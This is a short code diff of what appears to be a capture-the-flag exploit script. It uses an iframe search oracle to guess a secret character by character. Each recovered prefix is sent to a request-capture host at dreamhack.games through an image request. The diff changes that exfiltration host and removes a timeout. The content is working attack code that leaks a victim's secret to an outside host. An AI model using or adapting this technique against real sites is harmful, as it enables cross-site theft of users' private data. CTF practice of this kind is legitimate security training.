@@ -21,11 +21,6 @@
                         document.body.removeChild(ifr);
                         resolve(isFound);
                     }
-
-                    setTimeout(() => {
-                        document.body.removeChild(ifr);
-                        resolve(false);
-                    }, 300);
                 })
             }
 
@@ -40,7 +35,7 @@
                     for (let c of chars) {
                         if (await search(secret + c)) {
                             secret += c;
-                            new Image().src = `https://polavgc.request.dreamhack.games?secret=${secret}`;
+                            new Image().src = `https://wrisagx.request.dreamhack.games?secret=${secret}`;
                             console.log(`found: ${secret}`);
                             found = true;
 
